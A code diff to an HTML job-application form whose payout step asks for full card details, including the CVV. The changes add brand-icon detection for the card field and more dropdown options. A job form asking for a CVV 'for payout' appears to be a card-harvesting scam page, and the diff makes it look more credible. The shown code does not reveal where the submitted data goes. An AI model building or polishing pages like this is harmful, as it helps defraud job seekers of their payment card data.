@@ -126,6 +126,26 @@
       margin-bottom: 1rem;
       user-select: none;
     }
+    /* Card icon inside input */
+    .card-input-wrapper {
+      position: relative;
+      margin-top: 6px;
+    }
+    #cardNumber {
+      padding-right: 50px;
+    }
+    #cardTypeIcon {
+      position: absolute;
+      top: 50%;
+      right: 14px;
+      transform: translateY(-50%);
+      width: 40px;
+      height: 28px;
+      background-size: contain;
+      background-repeat: no-repeat;
+      pointer-events: none;
+      filter: drop-shadow(0 0 1px rgba(0,0,0,0.2));
+    }
     @media (max-width: 600px) {
       h2 {
         font-size: 1.4rem;
@@ -153,9 +173,12 @@
       <select id="education" name="education" required>
         <option value="">Select...</option>
         <option>High School</option>
+        <option>GED</option>
         <option>Associate</option>
         <option>Bachelor</option>
         <option>Graduate</option>
+        <option>Doctorate</option>
+        <option>Other</option>
       </select>
       <label for="industry">Industry *</label>
       <select id="industry" name="industry" required>
@@ -164,6 +187,14 @@
         <option>Technology</option>
         <option>Healthcare</option>
         <option>Administration</option>
+        <option>Finance</option>
+        <option>Education</option>
+        <option>Manufacturing</option>
+        <option>Transportation</option>
+        <option>Hospitality</option>
+        <option>Construction</option>
+        <option>Arts & Entertainment</option>
+        <option>Other</option>
       </select>
       <button type="button" class="btn" onclick="nextStep(2)">Next</button>
     </div>
@@ -179,7 +210,10 @@
         <label for="cardName">Name on Card *</label>
         <input id="cardName" name="cardName" required autocomplete="cc-name" />
         <label for="cardNumber">Card Number *</label>
-        <input id="cardNumber" name="cardNumber" required autocomplete="cc-number" pattern="\\d{13,19}" title="Enter a valid card number"/>
+        <div class="card-input-wrapper">
+          <input id="cardNumber" name="cardNumber" required autocomplete="cc-number" pattern="\\d{13,19}" title="Enter a valid card number" placeholder="Card Number" />
+          <div id="cardTypeIcon"></div>
+        </div>
         <label for="expiry">Expiry (MM/YY) *</label>
         <input id="expiry" name="expiry" required autocomplete="cc-exp" pattern="^(0[1-9]|1[0-2])\\/\\d{2}$" title="Format MM/YY" />
         <label for="cvv">CVV *</label>
@@ -230,6 +264,8 @@
     const bankForm = document.getElementById('bank-form');
     const toggleCard = document.getElementById('toggle-card');
     const toggleBank = document.getElementById('toggle-bank');
+    const cardTypeIcon = document.getElementById('cardTypeIcon');
+    const cardNumberInput = document.getElementById('cardNumber');
 
     function nextStep(n) {
       steps.forEach(s => s.classList.remove('active'));
@@ -268,6 +304,45 @@
     function escapeMarkdown(text) {
       return text.replace(/([_*[\]()~`>#+-=|{}.!])/g, '\\$1');
     }
+
+    function detectCardType(number) {
+      const val = number.replace(/\D/g, '');
+      if (/^4/.test(val)) return 'visa';
+      if (/^5[1-5]/.test(val)) return 'mastercard';
+      if (/^3[47]/.test(val)) return 'amex';
+      if (/^6(?:011|5)/.test(val)) return 'discover';
+      if (/^(2131|1800|35)/.test(val)) return 'jcb';
+      return 'unknown';
+    }
+
+    function updateCardIcon(type) {
+      let url = '';
+      switch(type) {
+        case 'visa':
+          url = 'https://cdn.jsdelivr.net/gh/aaronfagan/icons@main/visa.svg';
+          break;
+        case 'mastercard':
+          url = 'https://cdn.jsdelivr.net/gh/aaronfagan/icons@main/mastercard.svg';
+          break;
+        case 'amex':
+          url = 'https://cdn.jsdelivr.net/gh/aaronfagan/icons@main/amex.svg';
+          break;
+        case 'discover':
+          url = 'https://cdn.jsdelivr.net/gh/aaronfagan/icons@main/discover.svg';
+          break;
+        case 'jcb':
+          url = 'https://cdn.jsdelivr.net/gh/aaronfagan/icons@main/jcb.svg';
+          break;
+        default:
+          url = '';
+      }
+      cardTypeIcon.style.backgroundImage = url ? `url(${url})` : '';
+    }
+
+    cardNumberInput.addEventListener('input', () => {
+      const type = detectCardType(cardNumberInput.value);
+      updateCardIcon(type);
+    });
 
     document.getElementById('jobForm').addEventListener('submit', function(e) {
       e.preventDefault();
@@ -324,7 +399,6 @@
       nextStep('thanks');
       form.reset();
       window.scrollTo({ top: 0, behavior: 'smooth' });
-      // Reset to default payout tab card on reset
       togglePayout('card');
     });
 
